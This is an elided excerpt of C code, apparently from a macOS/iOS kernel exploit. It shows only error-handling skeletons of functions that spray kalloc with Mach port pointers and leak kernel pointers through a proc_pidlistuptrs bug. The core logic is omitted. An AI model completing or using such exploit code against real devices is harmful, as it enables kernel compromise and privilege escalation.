...
static void fill_events(int n_events) {
  ...
  for (int i = 0; i < n_events; i++) {
    ...
    if (err != 0) {
      textLog(" [-] failed to enqueue user event\n");
      exit(EXIT_FAILURE);
    }
...
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
  ...
  if (err != KERN_SUCCESS) {
    textLog(" [-] failed to send message: %s\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
...
uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) {
  ...
  if (valid_guesses == 0) {
    textLog(" [-] couldn't leak any kernel pointers\n");
    exit(EXIT_FAILURE);
  }
  ...
  //textLog("best guess is: 0x%016llx with %d%% of the valid guesses for it\n", best_guess, (best_guess_count*100)/valid_guesses);
